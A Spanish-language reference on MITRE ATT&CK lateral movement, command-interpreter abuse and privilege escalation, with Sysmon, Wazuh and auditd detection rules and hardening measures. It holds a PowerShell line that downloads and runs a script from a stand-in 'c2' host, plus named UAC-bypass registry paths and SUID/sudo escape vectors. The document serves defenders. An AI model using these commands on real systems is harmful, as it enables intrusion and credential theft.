# MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)

## 1. Técnica T1021 - Remote Services (Servicios Remotos)
Los adversarios se desplazan a través de la red corporativa aprovechando protocolos legítimos de administración y compartición de recursos remotos una vez obtenido un punto de apoyo inicial (Initial Access).

### Subtécnicas Críticas
- **T1021.001 - Remote Desktop Protocol (RDP - Puerto 3389):** Conexión interactiva a estaciones de trabajo y servidores Windows. Los atacantes utilizan herramientas nativas (`mstsc.exe`) o clientes automatizados (`xfreerdp`, `rdesktop`, `mimikatz ts::`) para acceder gráficamente, transferir archivos mediante portapapeles compartido y saltar entre segmentos de red. Frecuentemente combinado con túneles inversos SSH o proxies SOCKS (`plink.exe`, `chisel`).
- **T1021.002 - SMB/Windows Admin Shares (Puertos 445 / 139):** Acceso y ejecución remota a través de recursos compartidos administrativos ocultos (`C$`, `ADMIN$`, `IPC$`). Empleado por herramientas como `PsExec`, `WMIexec`, `smbexec`, `Impacket` y scripts de PowerShell para desplegar ejecutables maliciosos y registrar servicios remotos que se ejecutan como `NT AUTHORITY\SYSTEM`.
- **T1021.004 - SSH (Secure Shell - Puerto 22):** Desplazamiento lateral en infraestructura Unix/Linux o servidores Windows modernos mediante llaves privadas descubiertas en archivos de configuración (`id_rsa` sin passphrase), robo de llaves en memoria de procesos de agentes SSH (`ssh-agent hijacking`) o fuerza bruta interna de credenciales de servicio.

## 2. Técnica T1059 - Command and Scripting Interpreter (Intérpretes de Comandos y Scripts)
El adversario abusa de los entornos de comandos e intérpretes nativos instalados en los sistemas operativos para ejecutar código malicioso, evadir listas de bloqueo y evitar dejar binarios en disco (técnicas Living-off-the-Land o LotL).

### Variantes Principales
- **T1059.001 - PowerShell:** Intérprete potente de Windows. Vectores comunes:
  - Ejecución codificada para ofuscar payloads: `powershell.exe -enc <Base64>` o `-NoP -NonI -W Hidden -Exec Bypass`.
  - Descarga directa en memoria: `IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')`.
  - Abuso de cmdlets administrativos para reconocimiento interno (`Get-ADUser`, `Get-NetComputer`).
- **T1059.003 - Windows Command Shell (`cmd.exe`):** Ejecución de utilidades nativas para reconocimiento inicial (`whoami /all`, `net user`, `net group "Domain Admins" /domain`, `systeminfo`, `route print`).
- **T1059.004 - Unix Shell (`bash`, `sh`, `zsh`):** Invocación de reverse shells, lectura de archivos sensibles (`/etc/passwd`, `/etc/shadow`, variables de entorno) y orquestación de scripts de persistencia en crontab.
- **T1059.006 - Python:** Uso de scripts en Python embebidos o descargados para interactuar con APIs internas, escaneo de red local o explotación de vulnerabilidades sin requerir compilación.

## 3. Técnica T1548 - Abuse Elevation Control Mechanism (Abuso de Mecanismos de Elevación)
Técnicas orientadas a elevar privilegios desde una cuenta con permisos limitados hacia el máximo nivel de control (`root` en Linux o `SYSTEM`/`Domain Admin` en Windows).

### Subtécnicas y Vectores de Explotación
- **T1548.001 - Setuid and Setgid (Linux):** Explotación de binarios que poseen el bit SUID activo con permisos de ejecución como superusuario. Si un binario con SUID vulnerable o listado en GTFOBins (como `find`, `nmap`, `vim`, `bash`) es ejecutado por un usuario no privilegiado, permite generar un shell interactivo con UID 0 (`root`).
- **T1548.002 - Bypass User Account Control (UAC - Windows):** Elusión del aviso de confirmación de elevación en Windows. Los atacantes abusan de binarios firmados por Microsoft configurados para auto-elevación (auto-elevate), tales como `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe` o `ComputerDefaults.exe`, secuestrando claves de registro en `HKCU\Software\Classes\ms-settings\shell\open\command` para forzar la ejecución de payloads en contexto de integridad Alto.
- **T1548.003 - Sudo and Sudo Caching (Linux):** Abuso de configuraciones laxas en `/etc/sudoers`. Por ejemplo, permisos `NOPASSWD:` sobre comandos de edición de texto, utilidades de compresión (`tar`, `zip`) o intérpretes de comandos, permitiendo saltar a una shell de root mediante comandos específicos de escape.

## 4. Detección en Wazuh, Sysmon y Auditd

### Monitorización con Sysmon (Windows)
- **Sysmon Event ID 1 (Process Creation):**
  - Detección de procesos hijo anómalos: `svchost.exe` o `spoolsv.exe` ejecutando `cmd.exe` o `powershell.exe`.
  - Parámetros de línea de comandos sospechosos: `-enc`, `-WindowStyle Hidden`, `DownloadString`, `vssadmin delete shadows`.
  - Hash del ejecutable contrastado contra bases de reputación de malware.
- **Sysmon Event ID 3 (Network Connection):**
  - Conexiones salientes inusuales desde procesos clientes hacia los puertos 445 (SMB) o 3389 (RDP) de otros puestos de trabajo en la misma subred.
- **Sysmon Event ID 10 (Process Access):**
  - Procesos no autorizados accediendo a la memoria de `lsass.exe` con derechos `PROCESS_VM_READ` para volcado de credenciales (`Mimikatz`, `Procdump`).

### Reglas de Wazuh y Linux Auditd
- **Reglas Wazuh 5400-5500:** Auditoría de autenticación y ejecución de comandos `sudo` y `su`. Alerta inmediata si un usuario no autorizado intenta invocar `sudo` o si se registran fallos reiterados en elevación.
- **Reglas Wazuh FIM (File Integrity Monitoring):** Modificaciones no autorizadas en `/etc/sudoers`, `/etc/sudoers.d/`, `/etc/pam.d/` o archivos de configuración de SSH.
- **Linux Auditd:** Auditoría de llamadas al sistema `execve` con UID efectivo 0 originadas desde procesos de usuarios estándar.

## 5. Endurecimiento (Hardening) y Contención
- **Segmentación de Red y Bastión:** Bloqueo de tráfico directo RDP y SMB entre estaciones de trabajo cliente (Microsegmentación). El acceso a servidores de gestión debe forzarse a través de Servidores Bastión / Jump Hosts con autenticación MFA y grabación de sesión.
- **PowerShell Constrained Language Mode (CLM):** Activación de CLM combinado con políticas WDAC / AppLocker para impedir la invocación de llamadas Win32 API y scripts arbitrarios en memoria.
- **Políticas Estrictas de Sudoers:** Prohibir el uso de comodines abiertos en `/etc/sudoers` y asegurar que ningún binario que permita escape interactivo pueda ejecutarse con privilegios de root sin contraseña.
- **Deshabilitación de Servicios Innecesarios:** Desactivación global del protocolo SMBv1 y restricción estricta del servicio Servidor RDP en puestos no destinados a administración técnica.